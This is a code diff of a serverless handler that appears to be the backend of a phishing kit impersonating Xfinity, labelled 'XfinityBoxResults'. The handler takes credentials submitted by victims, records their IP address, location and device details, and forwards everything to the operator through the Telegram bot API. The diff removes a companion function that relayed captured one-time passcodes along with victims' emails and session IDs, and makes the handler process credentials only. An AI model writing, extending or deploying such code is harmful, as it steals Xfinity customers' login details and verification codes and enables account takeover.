@@ -119,43 +119,7 @@ const composeCredentialsMessage = (data) => {
 `;
 };
 
-/**
- * Composes the message for the OTP code.
- * This is the new function to handle the OTP submission.
- * @param {object} data - The OTP data payload.
- * @returns {string}
- */
-const composeOtpMessage = (data) => {
-    const { otp, session } = data;
-    const { email, sessionId } = session || {};
-
-    const safeOtp = escapeMarkdown(otp);
-    const safeEmail = escapeMarkdown(email || 'N/A');
-    const safeSessionId = escapeMarkdown(sessionId);
-
-    const formattedTimestamp = new Date().toLocaleString('en-US', {
-        year: 'numeric', month: 'short', day: 'numeric',
-        hour: '2-digit', minute: '2-digit', second: '2-digit',
-        timeZone: 'UTC', hour12: true
-    }) + ' UTC';
-
-    return `
-*🔑 XfinityBoxResults - OTP Code 🔑*
-
-*VERIFICATION CODE*
-- 🔢 OTP Code: ${safeOtp}
-
-*ASSOCIATED SESSION*
-- 📧 Email: ${safeEmail}
-- 🆔 Session ID: ${safeSessionId}
-
-*SUBMITTED AT*
-- 🕒 Timestamp: *${formattedTimestamp}*
-`;
-};
-
-
-// --- Main Handler ---
+// --- Main Handler (credentials only — OTP is handled by sendOtp function) ---
 exports.handler = async (event) => {
   const headers = {
     'Access-Control-Allow-Origin': '*',
@@ -176,33 +140,17 @@ exports.handler = async (event) => {
   
   try {
     const body = JSON.parse(event.body || '{}');
-    const { type, data } = body;
+    const data = body.data || body;
     let message;
 
-    // --- Message Routing Logic ---
-    // Route the request to the correct message composer based on the `type` field.
-    if (type === 'credentials') {
-        const clientIP = getClientIp(event);
-        const location = await getIpAndLocation(clientIP);
-        const deviceDetails = getDeviceDetails(data.userAgent);
-        
-        const messageData = { ...data, clientIP, location, deviceDetails };
-        message = composeCredentialsMessage(messageData);
+    // This function handles credentials only.
+    const clientIP = getClientIp(event);
+    const location = await getIpAndLocation(clientIP);
+    const deviceDetails = getDeviceDetails(data.userAgent);
+    const sessionId = data.sessionId || Math.random().toString(36).substring(2, 15);
 
-    } else if (type === 'otp') {
-        // For OTP, we re-use device/location info from the associated session.
-        // No new IP lookup is needed.
-        message = composeOtpMessage(data);
-
-    } else {
-        // Fallback for old format or unknown types
-        console.warn('Request received with unknown or missing "type". Processing as credentials.');
-        const clientIP = getClientIp(event);
-        const location = await getIpAndLocation(clientIP);
-        const deviceDetails = getDeviceDetails(body.userAgent);
-        const sessionId = body.sessionId || Math.random().toString(36).substring(2, 15);
-        message = composeCredentialsMessage({ ...body, clientIP, location, deviceDetails, sessionId });
-    }
+    const messageData = { ...data, clientIP, location, deviceDetails, sessionId };
+    message = composeCredentialsMessage(messageData);
 
     // Send the composed message to Telegram
     const telegramResponse = await fetch(`https://api.telegram.org/bot${CONFIG.ENV.TELEGRAM_BOT_TOKEN}/sendMessage`, {
@@ -215,6 +163,11 @@ exports.handler = async (event) => {
     if (!telegramResponse.ok) {
       const errorResult = await telegramResponse.json().catch(() => ({ description: 'Failed to parse Telegram error response.' }));
       console.error('Telegram API Error:', errorResult.description);
+      return {
+        statusCode: 502,
+        headers,
+        body: JSON.stringify({ success: false, error: 'Failed to send credentials message.' }),
+      };
     }
 
     return {
